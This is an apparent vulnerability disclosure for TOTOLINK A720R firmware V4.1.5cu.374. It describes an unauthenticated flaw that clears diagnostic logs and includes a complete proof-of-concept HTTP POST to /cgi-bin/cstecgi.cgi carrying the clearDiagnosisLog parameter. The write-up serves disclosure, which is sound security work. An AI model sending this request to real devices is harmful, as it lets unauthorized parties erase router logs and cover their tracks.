# Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/203/ids/36.html

# Affected version

V4.1.5cu.374

# Vulnerability details

The TOTOLINK A720R V4.1.5cu.374 firmware contains an unauthenticated diagnostic log clearing vulnerability. An attacker can exploit this flaw by sending a crafted POST request with the parameter `{"topicurl":"clearDiagnosisLog"}` to `/cgi-bin/cstecgi.cgi`, allowing unauthorized clearing of ping diagnostic logs without authentication.

# Poc

Diagnosis logs are normally recorded.

![图 0](img/355873a1c6cd8fca3d27b132d448f095be36454ade50acf3fe0c4f2a281fc5ff.png)  

Send a request to clear the diagnosis log.

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.140.79
Content-Length: 32
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.140.79
Referer: http://192.168.140.79/basic/index.html?time=1745238634622
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive

{"topicurl":"clearDiagnosisLog"}
```

![图 1](img/0c3e3e039192da917d00d3d3df381a5c574eab6ff22bf4849ca433a90c6be832.png)  

The diagnosis logs are cleared.

![图 2](img/72f436e041e5c6c715c21bcd2ff2e888686c4077c1da6546e1311d6a6fe1a95a.png)  
